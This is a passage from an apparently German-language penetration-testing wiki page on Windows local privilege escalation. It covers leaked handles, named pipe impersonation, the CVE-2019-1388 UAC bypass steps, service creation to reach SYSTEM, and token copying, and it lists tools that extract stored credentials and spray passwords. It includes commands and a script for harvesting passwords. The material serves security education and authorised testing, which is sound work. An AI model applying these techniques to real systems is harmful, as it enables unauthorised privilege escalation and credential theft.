Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stellen Sie sich vor, dass **ein Prozess, der als SYSTEM ausgeführt wird, einen neuen Prozess** (`OpenProcess()`) mit **voller Zugriffsberechtigung** öffnet. Der gleiche Prozess **erstellt auch einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn Sie dann **vollen Zugriff auf den niedrig privilegierten Prozess** haben, können Sie das **offene Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde**, ergreifen und **Shellcode injizieren**.\
[Lesen Sie dieses Beispiel für weitere Informationen darüber, **wie man diese Schwachstelle erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
[Lesen Sie diesen **anderen Beitrag für eine umfassendere Erklärung, wie man mehr offene Handles von Prozessen und Threads, die mit unterschiedlichen Berechtigungsstufen (nicht nur voller Zugriff) geerbt wurden, testet und missbraucht**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsame Speichersegmente, die als **Pipes** bezeichnet werden, ermöglichen die Kommunikation und den Datenaustausch zwischen Prozessen.

Windows bietet eine Funktion namens **Named Pipes**, die es nicht verwandten Prozessen ermöglicht, Daten zu teilen, selbst über verschiedene Netzwerke hinweg. Dies ähnelt einer Client/Server-Architektur, bei der die Rollen als **Named Pipe Server** und **Named Pipe Client** definiert sind.

Wenn Daten durch eine Pipe von einem **Client** gesendet werden, hat der **Server**, der die Pipe eingerichtet hat, die Möglichkeit, die **Identität** des **Clients** zu **übernehmen**, vorausgesetzt, er hat die erforderlichen **SeImpersonate**-Rechte. Die Identifizierung eines **privilegierten Prozesses**, der über eine Pipe kommuniziert und den Sie nachahmen können, bietet die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem Sie die Identität dieses Prozesses übernehmen, sobald er mit der von Ihnen eingerichteten Pipe interagiert. Für Anweisungen zur Durchführung eines solchen Angriffs sind hilfreiche Anleitungen [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system) zu finden.

Außerdem ermöglicht das folgende Tool, **eine Named Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht es, alle Pipes aufzulisten und zu sehen, um Privilegien zu erlangen** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Überwachung von Befehlszeilen auf Passwörter**

Wenn Sie eine Shell als Benutzer erhalten, können geplante Aufgaben oder andere Prozesse ausgeführt werden, die **Anmeldeinformationen in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen der Prozesse und vergleicht den aktuellen Zustand mit dem vorherigen Zustand, wobei alle Unterschiede ausgegeben werden.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Von Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Benutzeroberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" von einem unprivilegierten Benutzer auszuführen.

Dies ermöglicht es, die Berechtigungen zu eskalieren und UAC gleichzeitig mit derselben Schwachstelle zu umgehen. Darüber hinaus ist es nicht erforderlich, etwas zu installieren, und die während des Prozesses verwendete Binärdatei ist signiert und von Microsoft herausgegeben.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, ist es notwendig, die folgenden Schritte auszuführen:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Sie haben alle notwendigen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388

## Vom Administrator-Medium zum hohen Integritätslevel / UAC-Umgehung

Lesen Sie dies, um **über Integritätslevel zu lernen**:

{{#ref}}
integrity-levels.md
{{#endref}}

Lesen Sie dann **dies, um über UAC und UAC-Umgehungen zu lernen:**

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## **Vom hohen Integritätslevel zum System**

### **Neuer Dienst**

Wenn Sie bereits auf einem hohen Integritätsprozess laufen, kann der **Übergang zu SYSTEM** einfach sein, indem Sie **einen neuen Dienst erstellen und ausführen**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Von einem High Integrity-Prozess aus könnten Sie versuchen, die **AlwaysInstallElevated-Registrierungseinträge** zu **aktivieren** und eine Reverse-Shell mit einem _**.msi**_-Wrapper zu **installieren**.\
[Weitere Informationen zu den beteiligten Registrierungsschlüsseln und wie man ein _.msi_-Paket installiert, finden Sie hier.](#alwaysinstallelevated)

### High + SeImpersonate-Berechtigung zu System

**Sie können** [**den Code hier finden**](seimpersonate-from-high-to-system.md)**.**

### Von SeDebug + SeImpersonate zu vollständigen Token-Berechtigungen

Wenn Sie diese Token-Berechtigungen haben (wahrscheinlich finden Sie dies in einem bereits High Integrity-Prozess), können Sie **fast jeden Prozess** (nicht geschützte Prozesse) mit der SeDebug-Berechtigung **öffnen**, das **Token** des Prozesses **kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Mit dieser Technik wird normalerweise **ein beliebiger Prozess, der als SYSTEM ausgeführt wird, mit allen Token-Berechtigungen ausgewählt** (_ja, Sie können SYSTEM-Prozesse ohne alle Token-Berechtigungen finden_).\
**Sie können ein** [**Beispiel für den Code, der die vorgeschlagene Technik ausführt, hier finden**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von Meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, **ein Pipe zu erstellen und dann einen Dienst zu erstellen/auszunutzen, um auf dieses Pipe zu schreiben**. Dann kann der **Server**, der das Pipe mit der **`SeImpersonate`**-Berechtigung erstellt hat, das **Token** des Pipe-Clients (des Dienstes) **nachahmen** und SYSTEM-Berechtigungen erhalten.\
Wenn Sie [**mehr über benannte Pipes erfahren möchten, sollten Sie dies lesen**](#named-pipe-client-impersonation).\
Wenn Sie ein Beispiel lesen möchten, [**wie man von hoher Integrität zu System mit benannten Pipes gelangt, sollten Sie dies lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es Ihnen gelingt, eine **dll** zu **hijacken**, die von einem **Prozess** ausgeführt wird, der als **SYSTEM** läuft, können Sie beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch nützlich für diese Art der Privilegieneskalation und zudem **viel einfacher von einem High Integrity-Prozess aus zu erreichen**, da er **Schreibberechtigungen** für die Ordner hat, die zum Laden von DLLs verwendet werden.\
**Sie können** [**hier mehr über Dll Hijacking erfahren**](dll-hijacking/index.html)**.**

### **Von Administrator oder Netzwerkdienst zu System**

{{#ref}}
https://github.com/sailay1996/RpcSsImpersonator
{{#endref}}

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollständigen Berechtigungen

**Lesen:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Das beste Tool zur Suche nach Windows-Privilegieneskalationsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Überprüfen Sie auf Fehlkonfigurationen und sensible Dateien (**[**hier überprüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Überprüfen Sie auf einige mögliche Fehlkonfigurationen und sammeln Sie Informationen (**[**hier überprüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Überprüfen Sie auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Es extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Verwenden Sie -Thorough lokal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldeinformationen aus dem Anmeldeinformations-Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprühen Sie gesammelte Passwörter über die Domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS/NBNS-Spoofer und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende Privilegieneskalation Windows-Enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Suchen Sie nach bekannten Privilegieneskalationsanfälligkeiten (DEPRECATED für Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Überprüfungen **(Benötigt Administratorrechte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Suchen Sie nach bekannten Privilegieneskalationsanfälligkeiten (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (mehr ein Informationssammlungswerkzeug als Privilegieneskalation) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldeinformationen aus vielen Softwareanwendungen (vorkompilierte exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Überprüfen Sie auf Fehlkonfigurationen (ausführbare Datei vorkompiliert in github). Nicht empfohlen. Funktioniert nicht gut in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Überprüfen Sie auf mögliche Fehlkonfigurationen (exe aus python). Nicht empfohlen. Funktioniert nicht gut in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf diesem Beitrag basiert (es benötigt keinen accesschk, um ordnungsgemäß zu funktionieren, kann ihn aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Sie müssen das Projekt mit der richtigen Version von .NET kompilieren ([siehe dies](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte Version von .NET auf dem Zielhost zu sehen, können Sie Folgendes tun:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliographie

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{{#include ../../banners/hacktricks-training.md}}
